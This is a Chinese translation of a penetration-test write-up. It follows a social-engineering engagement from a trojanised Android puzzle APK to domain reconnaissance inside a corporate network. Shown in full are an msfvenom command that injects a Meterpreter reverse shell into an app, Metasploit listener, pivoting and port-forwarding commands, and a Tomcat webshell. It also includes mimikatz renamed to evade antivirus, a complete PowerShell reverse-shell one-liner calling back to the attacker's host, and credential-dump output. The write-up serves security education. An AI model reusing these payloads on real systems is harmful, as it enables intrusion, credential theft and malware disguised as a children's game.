
# 【技术分享】公司智能手机安全（一）——从APK到Golden Ticket：初步探测


                                阅读量   
                                **89032**
                            
                        |
                        
                                                                                                                                    ![](./img/85960/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：infosecinstitute.com
                                <br>原文地址：[http://resources.infosecinstitute.com/apk-golden-ticket-owning-android-smartphone-gaining-domain-admin-rights/](http://resources.infosecinstitute.com/apk-golden-ticket-owning-android-smartphone-gaining-domain-admin-rights/)

译文仅供参考，具体内容表达以及含义原文为准

[![](./img/85960/t019abfd05eb485fcc8.jpg)](./img/85960/t019abfd05eb485fcc8.jpg)



翻译：[村雨其实没有雨](http://bobao.360.cn/member/contribute?uid=2671379114)

预估稿费：200RMB

投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿



从一台Android智能手机，获取域管理员权限，甚至更多…

本文介绍了在企业网络中使用个人智能手机的潜在危险，在现实案例发生之后，这些案例被作为了典型。事实证明，欺骗一名员工安装恶意应用程序、绕过网络保护、访问企业网络、提权并获取保密信息并不困难。

此外，事实证明了在不被发现的情况下绕过所有的防护机制（包括反病毒软件）是可能的。攻击者可以通过使用一些系统自带的工具和能够公开访问到的脚本来实现绕过，而不需要太过于依赖外部工具。

这就是我们常说的K.I.S.S策略（Keep It Simple Stupid）

下面的故事如与真实事件或真实人物有任何相似之处，纯属巧合。

<br>

**背景**

“超级公司”聘请了我们的渗透测试工程师对其员工进行社会工程学评估，测试的范围是找到所有能窃取机密资料的方法，从而利用员工

在内部见面会期间，我们要求访问访客WiFi。访客WiFi受到专属保护，因此需要登录，凭证有效期仅为一天。

一旦连接上了WiFi，我们就开始从iPhone手机用Fing进行了一次快速扫描：结果我们发现了几台Android设备——这显然是超过了公司访客的人数。我们认为甚至公司职员也使用访客WiFi。也许可以节省他们宝贵的数据计划。事实上，给我们登录凭证的接待员在我们询问如何访问网络时，正在聊WhatsApp。

场景：桌子上有两部电话，整洁的桌面，一家三口的照片。

在短暂的闲聊之后，我了解到了她女儿四岁了，非常活跃，但是只要有装了游戏的智能手机就能平静下来。啊，现在的孩子们啊…

<br>

**攻击描述**

社会工程学是从一次小型钓鱼活动开始的，虽然惨遭失败。我们随后发现公司职员在我们攻击之前，都受到过相关训练，对附件、下载等行为都有很强的警惕性，我们的开端并不好。

于是我们决定把精力集中在接待员身上，我们的目的是让她为孩子下载Android应用，有什么对孩子来说比拼图更有意思呢，哈 我们喜欢拼图啊。

[![](./img/85960/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t019666c0865239b49d.png)

找到接待员的email个人地址非常容易，我们准备了一封电子邮件，里面有一个链接定位到下载页面。我们还在邮件里加了一个二维码，只要像拍照一样扫一下就能安装了。

[![](./img/85960/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t011d5dbaf73362ec1e.png)

很可爱对吧！我们的目标很容易就会装上恶意安卓应用，这个应用程序确实是一个拼图游戏，只是里面藏了一个Meterpreter的shell

<br>

**瞄准智能手机**

创建一款恶意安卓应用非常简单，我们下载了一个普通应用，然后使用msfvenom来注入了payload，也就是meterpreter shell

```
msfvenom -x puzzle.apk -p android/meterpreter/reverse_tcp LHOST=&lt;OUR_PUBLIC_IP&gt; LPORT=443 -o /var/www/html/puzzle.apk
```

使用443端口进行监听的原因是，443和80端口都通常是被防火墙许可的标准端口

我们相信这款app能够引起接待员足够的兴趣，并忽略掉安装过程中的警告

在我们的主机上，也开启了一个监听程序：



```
msf&gt;use exploit/multi/handler
msf exploit(handler) &gt; set payload android/meterpreter/reverse_tcp
payload =&gt; android/meterpreter/reverse_tcp
msf exploit(handler) &gt; set lhost &lt;OUR_PUBLIC_IP&gt;
lhost =&gt; &lt;OUR_PUBLIC_IP&gt;
msf exploit(handler) &gt; set lport 443
lport =&gt; 443
msf exploit(handler) &gt; exploit -j -z
[*] Started reverse TCP handler on &lt;OUR_PUBLIC_IP&gt;:443
```

为了利用公司职员会为了个人目的使用访客WiFi这一点，我们还想再公司附近放一个天线

<br>

**利用Meterpreter**

大概早上8:00的时候，我在msfconsole上收到了消息：

```
[*] Meterpreter session 1 opened (&lt;OUR_PUBLIC_IP&gt;:443 -&gt;X.X.X.X:51990) at …
```

Bingo！她安装并运行了恶意安卓程序，我们现在获得了一个Meterpreter会话

现在我们需要知道她是否连接到了公司的WiFi网络。IP检测结果表明它是从蜂窝网络连接的，她可能在去办公室的路上，也许她女儿正在玩拼图游戏。

会话并没有持续太久，几分钟后我们丢失了shell，但是在9:00前我们又收到了另一个Session：

```
[*] Meterpreter session 2 opened (&lt;OUR_PUBLIC_IP&gt;:443 -&gt;K.K.K.K:61545) at …
```

这次IP是公司的，说明她连接到了公司的WiFi网络

于是我们开始进行了一些初步探查，除了几台智能手机，我们只在一个不同的子网下找到了一台DNS服务器



```
meterpreter&gt;ipconfig
…..
Interface 9
============
Name : wlan0 – wlan0
Hardware MAC : 20:6e:9c:75:94:ba
IPv4 Address : 10.118.1.13
IPv4 Netmask : 255.255.255.0
IPv6 Address : fe80::226e:9cff:fe75:94ba
IPv6 Netmask : ::
…….
meterpreter &gt; shell
Process 1 created.Channel 1 created.
getprop net.dns1
192.168.178.196
```

访客WiFi网络在10.118.1.0/24上，而DNS服务器位于另一个子网

为了访问子网，我们配置了路由

```
exploit(handler) &gt; route add 192.168.178.0 255.255.255.0 1
```

Nmap扫描不能执行，于是我们使用proxychains做了一次快速的ping扫描



```
msf auxiliary(socks4a) &gt; use auxiliary/server/socks4a
msf auxiliary(socks4a) &gt; show options
Module options (auxiliary/server/socks4a):
Name Current Setting Required Description
—- ————— ——– ———–
SRVHOST 0.0.0.0 yes The address to listen on
SRVPORT 1080 yes The port to listen on.
# Attacker &lt;-&gt; proxychains nmap -sn 192.168.178.0/24 &lt;-&gt; DNS network
Nmap scan report for 192.168.178.195
Host is up (0.15s latency).
Nmap scan report for 192.168.178.196
Host is up (0.22s latency).
```

主机对ping扫描都进行了回复

我们接着又进行了一次快速TCP扫描



```
msf exploit(handler) &gt; use auxiliary/scanner/portscan/tcp
msf auxiliary(tcp) &gt; set RHOSTS 192.168.178.195,196
msf auxiliary(tcp) &gt; set RPORTS 1-1024
msf auxiliary(tcp) &gt; run
[*] 192.168.178.195: – 192.168.178.195:80 – TCP OPEN
[*] 192.168.178.195: – 192.168.178.195:8080 – TCP OPEN
[*] 192.168.178.196: – 192.168.178.196:53 – TCP OPEN
```

这是我们对当前网络环境结构的推测：

[![](./img/85960/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t011a369e5d667bacd3.png)

<br>

**瞄准内网服务器**

主机192.168.178.195开放了80和8080端口，我们在本地转发了端口，以便能够在本地分析网络流量



```
meterpreter&gt; portfwd add -L 127.0.0.1 -l 8001 -r 192.168.178.195 -p 80
meterpreter&gt; portfwd add -L 127.0.0.1 -l 8002 -r 192.168.178.195 -p 8080
```

80端口暴露了公司的电话簿，我们现在仍然不知道他们为什么在访客网络上暴露这些信息

快速扫描没有发现明显漏洞，于是我们决定检查下8080端口

我们遇到了Apache Tomcat的基本身份验证，使用Hydra进行爆破，几分钟后我们用admin/password123456登录了系统

现在我们进入了Tomcat管理控制台，这应该是防火墙配置的错误，因为不论是Tomcat管理控制台还是公司的号码簿，都不应该暴露在访客网路

[![](./img/85960/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01b54b08bc8dd6ff9a.png)

我们计划在Tomcat上上传一个shell，以便能与底层操作系统进行交互。服务器指纹表明，我们正在对付的，是一台Windows服务器。

我们用Laudanum Injectable Web Exploit Code构造了war-archive，在管理页面上传了waf文件，其中包含了：

cmd.jsp：用于与cmd.exe进行交互

m.ps1：一个经过混淆和免杀的mimikatz.ps1，用于抓取密码和散列

由于其灵活性，混淆powershell脚本很容易，有几种著名的混淆技巧，我们只是改变了一些关键字，比如把Invoke-mimikatz改成Invoke-mymy什么的，还有一些其他的小技巧可供参考。

我们还在文件末尾添加了Invoke-mymy -dumpcreds，以便功能被直接执行

上传之后，我们就在浏览器访问了cmd.jsp

[![](./img/85960/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t019b0d1dbd4aee7908.png)

哈！用户是以SYSTEM权限运行服务的，我们继续进行信息收集。首先，来收集一下环境变量：

命令 cmd /c set

结果如下：



```
ALLUSERSPROFILE=C:ProgramData
COMPUTERNAME=SRVINTRANET
USERDOMAIN=SUPERCOMPANY
USERNAME=SRVINTRANET$
```

现在我们获取到了计算机名SRVINTRANET，与此同时，它属于SUPERCOMPANY域，完美。

继续使用systeminfo来检索其他有用信息：

命令：systeminfo

结果：



```
Host Name: SRVINTRANET
OS Name: Microsoft Windows Server 2012 R2 Standard
OS Version: 6.3.9600 N/A Build 9600
OS Manufacturer: Microsoft Corporation
OS Configuration: Member Server
OS Build Type: Multiprocessor Free
Registered Owner: Windows User
…
```

接下来是域控制器

命令：cmd /c nltest /dclist:supercompany

结果：



```
Get a list of DCs in domain ‘supercompany’ from ‘\SRVDC1′.
srvdc1.supercompany.local[PDC] [DS]Site: Default-First-Site-Name
srvdc2.supercompany.local [DS]Site: Default-First-Site-Name
The command completed successfully
```

这时候Android设备可能已经开始发热了，我们需要转移到一个更合适的shell上。Android设备已经不再适合我们的工作了。

我们的黄金法则是：保持隐蔽和躲避杀毒软件。于是我们使用了基于PowerShell的shell，希望SRVINTRANET能够访问互联网吧。

通过Tomcat上的webshell，我们装好了Powershell后门，将会执行单向回连的命令，与此同时我们的公网服务器用netcat监听了80端口



```
cmd /c powershell -nop -c “$c=New-Object Net.Sockets.TCPClient(‘&lt;OUR_PUBLIC_IP&gt;’,80); $s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb=(IEX $data 2&gt;&amp;1|Out-String);$sb2=$sb+’PS ‘+(pwd).Path+’&gt;’; $sb=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sb,0,$sb.Length);
$s.Flush()};$c.Close()”
```

这个脚本有什么功能呢？它会在启动PowerShell的时候执行以下命令：创建一个TCPClient对象，反向连接到我们的机器，打开一个I/O流，并使用InvokeExpression来执行输入的内容

我们这次没那么幸运了，没有收到反向shell。这台服务器可能不能连接到互联网，于是我们又一次转向了Tomcat的webshell，并且安装了混淆过的mimikatz



```
cmd /c powershell -executionpolicy bypass -f c:tomcatwebappscmdwarfilesm.ps1
.#####. mimikatz 2.1 (x64) built on Nov 10 2016 15:31:14
.## ^ ##. “A La Vie, A L’Amour”
## /  ## /* * *
##  / ## Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
‘## v ##’ http://blog.gentilkiwi.com/mimikatz (oe.eo)
‘#####’ with 20 modules * * */
mimikatz(powershell) # sekurlsa::logonpasswords
Authentication Id : 0 ; 191734 (00000000:0002ecf6)
Session : Interactive from 1
User Name : Administrator
Domain : SRVINTRANET
Logon Server : SRVINTRANET
Logon Time : 2/17/2017 2:12:31 PM
SID : S-1-5-21-938204560-2839928776-2225904511-500
msv :
[00010000] CredentialKeys
* NTLM : 604603ab105adc8XXXXXXXXXXXXXXXXX
    * SHA1 : 7754ff505598bf3XXXXXXXXXXXXXXXXXXXXXXXXX
[00000003] Primary
* Username : Administrator
* Domain : SRVINTRANET
* NTLM : 604603ab105adc8XXXXXXXXXXXXXXXXX
    * SHA1 : 7754ff505598bf3XXXXXXXXXXXXXXXXXXXXXXXXX
tspkg :
wdigest :
* Username : Administrator
* Domain : SRVINTRANET
* Password : (null)
kerberos :
* Username : Administrator
* Domain : SRVINTRANET
* Password : (null)
ssp :    KO
credman :
mimikatz(powershell) # exit
Bye!
```

我们得到了本地管理员的密码哈希，但是没有明文。这是因为我们的目标服务器是Windows Server 2012，而在2008以后，事情发生了变化，WDigest凭证就不再储存明文了（不禁怀念过去的美好时光），此外credman是空的。总之这次发现也不差吧。

我们决定找到一个能够访问互联网的服务器，因为我们现在依然在借助一个连接不稳定的安卓手机完成渗透工作。

通过net view命令，我们得到了可用的共享服务器列表



```
Server Name Remark
————————————————-
\SRVDC1 Domain controller PDC
\SRVDC2 [4] Domain Controller
\SRVWSUS Server WSUS
\SRVAV Server AV
\SRVFILE1 File Server
```

这就是真正的服务器网络
